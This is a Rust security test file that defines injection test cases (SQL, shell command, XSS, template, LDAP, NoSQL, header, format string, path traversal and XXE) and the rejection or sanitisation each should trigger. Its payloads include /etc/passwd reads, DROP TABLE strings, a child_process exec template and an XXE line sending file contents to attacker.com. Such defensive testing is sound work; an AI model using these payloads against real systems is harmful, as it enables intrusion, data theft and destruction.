//! ABOUTME: Comprehensive injection attack tests for all tools
//! ABOUTME: Tests for SQL, Command, Script, Template, and other injection vectors

use super::test_framework::*;
use serde_json::json;

/// SQL injection test vectors
pub fn sql_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "SQL_BASIC_OR".to_string(),
            description: "Basic OR injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users WHERE id = 1 OR 1=1",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_UNION_SELECT".to_string(),
            description: "UNION SELECT injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT name FROM users WHERE id = 1 UNION SELECT password FROM admin--",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_DROP_TABLE".to_string(),
            description: "DROP TABLE injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users; DROP TABLE users;--",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_TIME_BASED".to_string(),
            description: "Time-based blind SQL injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users WHERE id = 1 AND SLEEP(5)",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Timeout,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_STACKED_QUERIES".to_string(),
            description: "Stacked queries injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users WHERE id = 1; INSERT INTO admin VALUES ('hacker', 'password');",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_COMMENT_BYPASS".to_string(),
            description: "Comment-based bypass".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users WHERE id = 1/*comment*/OR/*comment*/1=1",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SQL_ENCODING_BYPASS".to_string(),
            description: "Encoding bypass attempt".to_string(),
            payload: json!({
                "operation": "query",
                "query": "SELECT * FROM users WHERE id = 1 %4F%52 1=1",
                "database": "test"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Command injection test vectors
pub fn command_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "CMD_SEMICOLON".to_string(),
            description: "Semicolon command injection".to_string(),
            payload: json!({
                "command": "echo test; cat /etc/passwd"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_PIPE".to_string(),
            description: "Pipe command injection".to_string(),
            payload: json!({
                "command": "echo test | cat /etc/passwd"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_AMPERSAND".to_string(),
            description: "Ampersand command injection".to_string(),
            payload: json!({
                "command": "echo test && cat /etc/passwd"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_BACKTICK".to_string(),
            description: "Backtick command substitution".to_string(),
            payload: json!({
                "command": "echo `cat /etc/passwd`"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_DOLLAR_PAREN".to_string(),
            description: "Dollar parenthesis substitution".to_string(),
            payload: json!({
                "command": "echo $(cat /etc/passwd)"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_NEWLINE".to_string(),
            description: "Newline injection".to_string(),
            payload: json!({
                "command": "echo test\ncat /etc/passwd"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_NULL_BYTE".to_string(),
            description: "Null byte injection".to_string(),
            payload: json!({
                "command": "echo test\0cat /etc/passwd"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "CMD_ENV_VAR".to_string(),
            description: "Environment variable injection".to_string(),
            payload: json!({
                "command": "echo $PATH; export MALICIOUS=1"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("MALICIOUS"),
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Script injection test vectors (JavaScript, Python, etc.)
pub fn script_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "XSS_BASIC_SCRIPT".to_string(),
            description: "Basic script tag injection".to_string(),
            payload: json!({
                "input": "<script>alert('XSS')</script>",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XSS_IMG_ONERROR".to_string(),
            description: "Image onerror injection".to_string(),
            payload: json!({
                "input": "<img src=x onerror=alert('XSS')>",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XSS_JAVASCRIPT_URL".to_string(),
            description: "JavaScript URL injection".to_string(),
            payload: json!({
                "input": "<a href='javascript:alert(1)'>Click</a>",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XSS_DATA_URL".to_string(),
            description: "Data URL injection".to_string(),
            payload: json!({
                "input": "<iframe src='data:text/html,<script>alert(1)</script>'>",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XSS_SVG".to_string(),
            description: "SVG-based XSS".to_string(),
            payload: json!({
                "input": "<svg onload=alert('XSS')>",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "XSS_ENCODED".to_string(),
            description: "Encoded XSS attempt".to_string(),
            payload: json!({
                "input": "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "operation": "process"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Template injection test vectors
pub fn template_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "SSTI_JINJA2".to_string(),
            description: "Jinja2 template injection".to_string(),
            payload: json!({
                "input": "{{config.items()}}",
                "engine": "jinja2",
                "context": {}
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("SECRET"),
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SSTI_HANDLEBARS_HELPER".to_string(),
            description: "Handlebars helper injection".to_string(),
            payload: json!({
                "input": "{{#with process}}{{mainModule.require('child_process').exec('id')}}{{/with}}",
                "engine": "handlebars",
                "context": {}
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SSTI_MATH_EVAL".to_string(),
            description: "Math expression evaluation".to_string(),
            payload: json!({
                "input": "{{7*7}}",
                "engine": "handlebars",
                "context": {}
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("49"),
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SSTI_CONSTRUCTOR".to_string(),
            description: "Constructor access attempt".to_string(),
            payload: json!({
                "input": "{{constructor.constructor('return process')()}}",
                "engine": "handlebars",
                "context": {}
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "SSTI_PROTO_POLLUTION".to_string(),
            description: "Prototype pollution attempt".to_string(),
            payload: json!({
                "input": "{{__proto__.polluted = true}}",
                "engine": "handlebars",
                "context": {}
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// LDAP injection test vectors
pub fn ldap_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "LDAP_WILDCARD".to_string(),
            description: "LDAP wildcard injection".to_string(),
            payload: json!({
                "input": "admin*",
                "operation": "search",
                "filter": "uid"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "LDAP_OR_INJECTION".to_string(),
            description: "LDAP OR injection".to_string(),
            payload: json!({
                "input": "admin)(|(uid=*",
                "operation": "search",
                "filter": "uid"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "LDAP_NULL_BYTE".to_string(),
            description: "LDAP null byte injection".to_string(),
            payload: json!({
                "input": "admin\0dc=example,dc=com",
                "operation": "search",
                "filter": "uid"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// NoSQL injection test vectors
pub fn nosql_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "NOSQL_OPERATOR_INJECTION".to_string(),
            description: "NoSQL operator injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": {"username": {"$ne": null}},
                "database": "mongodb"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "NOSQL_JS_INJECTION".to_string(),
            description: "NoSQL JavaScript injection".to_string(),
            payload: json!({
                "operation": "query",
                "query": {"$where": "this.password == 'test'"},
                "database": "mongodb"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "NOSQL_REGEX_DOS".to_string(),
            description: "NoSQL regex DoS".to_string(),
            payload: json!({
                "operation": "query",
                "query": {"username": {"$regex": "^(a+)+$"}},
                "database": "mongodb"
            }),
            expected_behavior: ExpectedBehavior::Timeout,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection, TestCategory::ResourceExhaustion],
        },
    ]
}

/// Header injection test vectors
pub fn header_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "HTTP_HEADER_CRLF".to_string(),
            description: "HTTP header CRLF injection".to_string(),
            payload: json!({
                "headers": {
                    "User-Agent": "Mozilla/5.0\r\nX-Injected: true"
                },
                "input": "https://example.com"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "EMAIL_HEADER_INJECTION".to_string(),
            description: "Email header injection".to_string(),
            payload: json!({
                "to": "user@example.com\r\nBcc: attacker@evil.com",
                "subject": "Test",
                "body": "Test email"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "HOST_HEADER_INJECTION".to_string(),
            description: "Host header injection".to_string(),
            payload: json!({
                "headers": {
                    "Host": "evil.com"
                },
                "input": "https://example.com"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Format string injection test vectors
pub fn format_string_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "FORMAT_PERCENT_N".to_string(),
            description: "Format string %n injection".to_string(),
            payload: json!({
                "input": "Hello %n%n%n",
                "operation": "format"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::High,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "FORMAT_PERCENT_S".to_string(),
            description: "Format string %s injection".to_string(),
            payload: json!({
                "input": "%s%s%s%s%s%s%s%s",
                "operation": "format"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Medium,
            categories: vec![TestCategory::Injection],
        },
        SecurityTestCase {
            name: "FORMAT_PERCENT_X".to_string(),
            description: "Format string %x injection".to_string(),
            payload: json!({
                "input": "%x.%x.%x.%x",
                "operation": "format"
            }),
            expected_behavior: ExpectedBehavior::Sanitize,
            severity: Severity::Low,
            categories: vec![TestCategory::Injection],
        },
    ]
}

/// Path injection test vectors
pub fn path_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "PATH_TRAVERSAL_BASIC".to_string(),
            description: "Basic path traversal".to_string(),
            payload: json!({
                "path": "../../../etc/passwd",
                "operation": "read"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::PathTraversal],
        },
        SecurityTestCase {
            name: "PATH_TRAVERSAL_ENCODED".to_string(),
            description: "URL encoded path traversal".to_string(),
            payload: json!({
                "path": "..%2F..%2F..%2Fetc%2Fpasswd",
                "operation": "read"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::PathTraversal],
        },
        SecurityTestCase {
            name: "PATH_TRAVERSAL_UNICODE".to_string(),
            description: "Unicode path traversal".to_string(),
            payload: json!({
                "path": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
                "operation": "read"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::PathTraversal],
        },
        SecurityTestCase {
            name: "PATH_ABSOLUTE".to_string(),
            description: "Absolute path access".to_string(),
            payload: json!({
                "path": "/etc/passwd",
                "operation": "read"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::High,
            categories: vec![TestCategory::PathTraversal],
        },
        SecurityTestCase {
            name: "PATH_UNC".to_string(),
            description: "UNC path injection".to_string(),
            payload: json!({
                "path": "\\\\attacker.com\\share\\file",
                "operation": "read"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Medium,
            categories: vec![TestCategory::PathTraversal],
        },
    ]
}

/// XXE injection test vectors
pub fn xxe_injection_tests() -> Vec<SecurityTestCase> {
    vec![
        SecurityTestCase {
            name: "XXE_FILE_DISCLOSURE".to_string(),
            description: "XXE file disclosure".to_string(),
            payload: json!({
                "input": r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"#,
                "operation": "parse"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("root:"),
            severity: Severity::Critical,
            categories: vec![TestCategory::XXE],
        },
        SecurityTestCase {
            name: "XXE_SSRF".to_string(),
            description: "XXE SSRF attack".to_string(),
            payload: json!({
                "input": r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>"#,
                "operation": "parse"
            }),
            expected_behavior: ExpectedBehavior::NotContainsText("ami-id"),
            severity: Severity::High,
            categories: vec![TestCategory::XXE, TestCategory::SSRF],
        },
        SecurityTestCase {
            name: "XXE_BILLION_LAUGHS".to_string(),
            description: "Billion laughs DoS".to_string(),
            payload: json!({
                "input": r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"#,
                "operation": "parse"
            }),
            expected_behavior: ExpectedBehavior::Timeout,
            severity: Severity::Medium,
            categories: vec![TestCategory::XXE, TestCategory::ResourceExhaustion],
        },
        SecurityTestCase {
            name: "XXE_PARAMETER_ENTITY".to_string(),
            description: "Parameter entity XXE".to_string(),
            payload: json!({
                "input": r#"<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param;
]>
<root>&exfil;</root>"#,
                "operation": "parse"
            }),
            expected_behavior: ExpectedBehavior::Reject,
            severity: Severity::Critical,
            categories: vec![TestCategory::XXE],
        },
    ]
}

/// Create all injection test cases
pub fn all_injection_tests() -> Vec<SecurityTestCase> {
    let mut tests = Vec::new();
    tests.extend(sql_injection_tests());
    tests.extend(command_injection_tests());
    tests.extend(script_injection_tests());
    tests.extend(template_injection_tests());
    tests.extend(ldap_injection_tests());
    tests.extend(nosql_injection_tests());
    tests.extend(header_injection_tests());
    tests.extend(format_string_injection_tests());
    tests.extend(path_injection_tests());
    tests.extend(xxe_injection_tests());
    tests
}